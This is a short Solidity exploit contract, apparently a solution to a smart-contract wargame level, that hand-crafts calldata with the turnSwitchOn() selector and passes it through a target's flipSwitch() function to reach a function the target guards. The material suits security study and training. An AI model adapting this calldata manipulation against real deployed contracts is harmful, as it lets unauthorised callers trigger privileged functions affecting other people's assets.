// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Switch {
    function flipSwitch(bytes memory) external;
    function turnSwitchOn() external;
    function turnSwitchOff() external;
}

contract SwitchAttack {
    address switchAddress;

    constructor(address _switchAddress) {
        switchAddress = _switchAddress;
    }

    function attack() external {
        bytes4 selector = bytes4(keccak256("turnSwitchOn()"));
        bytes memory callData = abi.encodeWithSelector(selector, "");

        Switch(switchAddress).flipSwitch(callData);
    }
}
